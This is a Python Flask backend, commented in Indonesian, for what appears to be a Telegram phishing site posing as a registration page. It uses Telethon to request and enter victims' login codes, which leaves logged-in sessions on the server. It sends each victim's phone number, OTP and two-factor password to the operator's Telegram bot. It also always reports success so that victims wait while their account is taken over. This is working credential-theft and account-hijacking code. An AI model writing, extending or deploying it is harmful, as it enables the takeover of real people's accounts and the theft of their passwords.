import os
import asyncio
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Membuka izin akses secara global untuk semua domain
CORS(app, resources={r"/*": {"origins": "*"}})

# Variabel Dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

def send_to_bot(message):
    """Kirim laporan log ke Bot Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except:
        pass

async def telethon_logic(data):
    """Logika Telethon: Deteksi OTP & Sandi"""
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'User')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # STEP 1: Kirim Kode OTP
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            send_to_bot(f"📲 *Mencoba Daftar*\nNama: {nama}\nNomor: {nomor}")
            return {"status": "success"}, 200

        # STEP 2: Verifikasi OTP & Deteksi 2FA
        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                # Beritahu frontend untuk pindah ke halaman sandi
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "error", "message": "Kode OTP Salah!"}, 400

        # STEP 3: Langsung Pindahkan ke Loading (Abaikan Validasi Sandi)
        elif step == 3:
            send_to_bot(f"🔑 *Sandi Masuk*\nNomor: {nomor}\nSandi: {sandi}")
            # Selalu kirim sukses agar website pindah ke halaman 24 jam
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

# FUNGSI DARURAT FIX CORS: Menyuntikkan header izin secara manual
def _force_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    return response

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    # Menangani Preflight (Pesan merah di konsol)
    if request.method == 'OPTIONS':
        return _force_cors(make_response())
        
    data = request.json
    try:
        result, status_code = async_to_sync(telethon_logic)(data)
        response = make_response(jsonify(result), status_code)
        return _force_cors(response)
    except Exception as e:
        response = make_response(jsonify({"status": "error", "message": str(e)}), 500)
        return _force_cors(response)

if __name__ == "__main__":
    # Menyesuaikan port 8080 dari log Railway
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)